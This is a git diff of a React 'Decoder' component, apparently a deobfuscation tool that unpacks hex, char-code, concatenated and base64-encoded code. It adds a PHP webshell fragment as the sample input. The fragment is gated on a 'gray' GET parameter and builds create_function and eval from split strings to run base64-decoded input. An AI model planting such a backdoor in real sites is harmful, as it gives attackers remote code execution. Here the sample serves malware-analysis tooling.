@@ -5,52 +5,63 @@ import { ButtonBar, UnTangler } from './index.js'
 
 
 export default class Decoder extends Component {
-
-
     constructor(props) {
         super(props)
         this.state = {
-            value: 'Decode Me!',
+            value: `if(isset($_GET["gray"])&&$_GET["gray"]=="gray"){$func="cr"."ea"."te_"."fun"."ction";$x=$func("\$c","e"."v"."al"."('?>'.base"."64"."_dec"."ode(\$c));")`,
             decoded: '',
-            decoders: {"hex": true, "fromChar": true, "fixConcats": true, "removeBadChars": true, "base64Decode": true, "Format": false}
+            decoders: {"hex": false, "fromChar": false, "fixConcats": false, "removeBadChars": false, "base64": false}
         }
     }
     HandleTextChange = (e) => {
-        this.setState({ value: e.target.value, decoded: e.target.value })
-    }
-    handleClick = (e) => {
         const target = e.target.value
-        const decoders = {...this.state.decoders}
-        this.setState(prevState => ({
-            decoders: {
-                ...prevState.decoders,
-                [target]:!prevState.decoders[target]
-            }
-        }))
+        let x = this.unTangle(target)
+        this.setState({value:target, decoded: x })
+    }
+    //?? Should clicking a button apply the change??? Probably, but its confusing me for now
+    handleClick = (e) => {
+        
+        //We need to update the state of decoders THEN decode the value and set state again
+        const target = e.target.value
+        const current = this.state.decoders
+        current[target] = !current[target]
+        this.setState({
+            decoders:current
+        },() => {
+            this.setState({decoded: this.unTangle(this.state.value) })
+        });
     }
     unTangle = (code) => {
         const unTangler = new UnTangler()
-        
-        Object.keys(this.state.decoders).forEach((decoder,i)=> {
-            if (this.state.decoders.decoder){
+        const decoders = {...this.state.decoders}
+        Object.keys(decoders).forEach((decoder,i)=> {
+            if (this.state.decoders[decoder]){
                 code = unTangler[decoder](code)
+                console.warn(`untangler being used module: ${decoder}\n ${code}`)
             }
-            return code
         })
+        return code
+    }
+    disableButtons = () =>{
+        const decoders = {...this.state.decoders}
+        Object.keys(decoders).forEach((decoder,i)=> {
+          decoders[decoders] = false
+        })
+        this.setState({decoders:decoders})
     }
     render() {
         return (
-            <div>
-                <div className="Controls">
+            <div className="decoder">
+                <div className="controls">
                     <ButtonBar
                         handleClick={(e) => {this.handleClick(e)}}
                         decoders={this.state.decoders}
                     />
                 </div>
                 <SplitterLayout>
-                    <div className="Input">
+                    <div className="input">
                         <textarea
-                            className="Input"
+                            className="input"
                             value={this.state.value}
                             onChange={(e) => { this.HandleTextChange(e) }}
                         />
